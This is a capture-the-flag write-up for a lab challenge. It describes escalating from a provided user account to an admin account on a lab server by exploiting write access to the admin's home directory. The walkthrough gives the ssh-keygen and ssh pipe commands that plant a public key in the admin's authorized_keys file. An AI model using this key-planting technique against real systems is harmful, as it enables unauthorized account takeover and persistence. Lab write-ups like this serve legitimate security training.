# Sharing Is Caring
## Challenge Description:
Proper permission management and access control have been a long-known issue in the IT department.<br>
For a while now, you have been trying to convince the CISO that this issue needs handling.<br>
Finally, he agreed to prioritize it, on the condition that you can provide him with a demonstration in which you compromise one of the company's machines.<br>

#### Your goals<br>
☛ To complete the task, you were provided with the user and password 'nicolas:pr1vt3st' to a server called 'avalanche-drp.'<br>
☛ Use the provided credentials to connect to the target server and perform system enumeration.<br>
☛ Escalate privileges to the Admin user.<br>

## Process:
This challenge is filled to the brim with red herrings.<br>
Log into nicolas@avalanche-drp via ssh.<br>
We will see that we have write permissions inside the 'admin's home directory, but cannot proceed beyond that. Let's create a '.ssh' directory and inside of it an empty 'authorized_keys' file.<br>

Use 'ssh-keygen -t rsa -b 4096 -f nicolas_key' to create a public and private key.<br>
Use the command 'cat nicolas_key.pub | ssh nicolas@avalanche-drp "cat >> /path/to/admin/.ssh/authorized_keys" 'to print the public key inside the authorized_key file, therefore granting us access into the admin's user.<br>

Run 'ssh -i [path to private key]admin@avalanche-drp' and you will find the key
